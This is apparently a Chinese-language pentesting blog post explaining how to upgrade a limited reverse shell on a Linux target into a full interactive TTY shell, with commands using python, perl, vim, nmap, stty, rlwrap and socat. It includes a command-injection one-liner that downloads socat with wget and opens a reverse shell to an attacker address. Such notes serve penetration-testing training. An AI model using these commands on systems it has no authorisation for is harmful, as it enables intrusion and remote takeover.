# Shell Spawning


&lt;!--more--&gt;

# Shell-Spawning（反弹shell到TTYShell）

当我们在 linux 机器上获得了一个 shell，这个 shell 可能没有 TTY（终端连接）功能，导致无法执行一些命令，例如切换用户的“su”命令或“nano”文件创建和修改工具。

同样，渗透测试中也有很多重要功能无法在没有TTY功能的shell 上运行。为了继续进行渗透测试，你将需要生成 TTY shell。

通常，在通过 nc 捕获 shell 之后，会在一个功能非常有限的 shell 中。例如没有命令历史记录（并使用向上“”和“向下”箭头循环浏览它们）和文件名称、命令补全等。在缺少这些功能的 shell 中查询或操作会比较麻烦。

**注意**：要检查 shell 是否是 TTY shell，请使用 `tty` 命令。



以下为非TTY shell中生成TTY shell的实用命令。

## 1、Basic commands

### 基于Python:

```bash
python -c &#39;import pty; pty.spawn(&#34;/bin/sh&#34;)&#39;
python3 -c &#39;import pty; pty.spawn(&#34;/bin/sh&#34;)&#39;
```



1. 首先连接到 shell 后，先检查一下 python 的可用性， 用 winch 命令检查：

```bash
which python python2 python3
```

只要安装了其中任何一个，就将返回已安装二进制文件的路径。

2. 在靶机上输入以下命令（使用机器上可用的 python 版本！）

```rust
python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;;
```

3. 接下来，在靶机上输入以下命令来设置一些重要的环境变量：

```bash
export SHELL=bash
export TERM=&#34;xterm-256color&#34; #允许 clear，并且有颜色
export TERM=&#34;screen-256color&#34; # TERM任选其一
```

4. 键入 ctrl-z 以将 shell 发送到后台。

5. 设置 shell 以通过反向 shell 发送控制字符和其他原始输入。使用以下stty命令来执行此操作。

```bash
stty raw -echo;fg
回车一次后
输入 reset 再回车
```

将再次进入 shell 中。

到此 TTY shell 升级完成。

### 其他命令：

```bash
echo os.system(&#39;/bin/bash&#39;)
/bin/sh -i

#python3
python3 -c &#39;import pty; pty.spawn(&#34;/bin/sh&#34;)&#39;

#perl
exec &#34;/bin/sh&#34;;
perl -e &#39;exec &#34;/bin/sh&#34;;&#39;

#ruby
exec &#34;/bin/sh&#34;
ruby -e &#39;exec &#34;/bin/sh&#34;&#39;

#lua
lua -e &#34;os.execute(&#39;/bin/sh&#39;)&#34;
```



## 2、nmap

nmap版本 **&lt;=5.21**.

```
nmap --interactive
!sh
```

这可以实现一个TTY交互shell，如果nmap还具备SUID权限，那么还可以实现权限提升的效果。



## 3、vi/vim

vi/vim 是一个可以在非TTY shell中运行的文本编辑器。

```
:!bash
```

或

```
:set shell=/bin/bash
:shell
```

## 4、STTY

“stty”命令允许您更改终端与系统的连接特性。 例如，使用 -a 选项获取当前配置：

```
stty -a
```

使用“stty”生成shell，步骤如下：

```shell
In victim machine reverse shell
$ python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
Ctrl-Z         

In Attacker console
# echo $TERM
# stty -a
# stty raw -echo
# fg
[enter]
[enter]              

In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows &lt;num&gt; columns &lt;cols&gt;
```



## 5、IRB

```shell
(From within IRB) - exec &#34;/bin/sh&#34;
```



## 5、rlwrap

可以通过使用 rlwrap 命令包装 nc 侦听器来减轻对 shell 的一些限制。默认情况下不会安装它，需要使用 `sudo apt rlwrap` 或 `apt-get install rlwrap` 安装。

```shell
$ rlwrap nc -lvnp $port
```

## 6、socat

另一种方法是将 socat 二进制文件上传到靶机并获得一个完全交互式的 shell。从 https://github.com/andrew-d/static-binaries 下载适当的二进制文件。Socat 需要在两台机器上才能工作。

```bash
#在本地监听：:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#靶机:
socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:10.0.11.100:1234
```

如果在命令注入的地方注入反弹 shell，获得即时完全交互式的反向 shell：

```bash
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /dev/shm/socat; chmod &#43;x /dev/shm/socat; /dev/shm/socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:10.0.11.100:1234
```

如果靶机访问不了互联网，就先把 socat 文件下载下来，开启 http 服务，然后将上面的路径指向你的本地地址。



## 参考文章

- https://www.cnblogs.com/sainet/p/15783539.html
- https://rcenetsec.com/shell-spawning/


---

> 作者: Xavier  
> URL: http://localhost:1313/posts/20230425-shellspawn/  

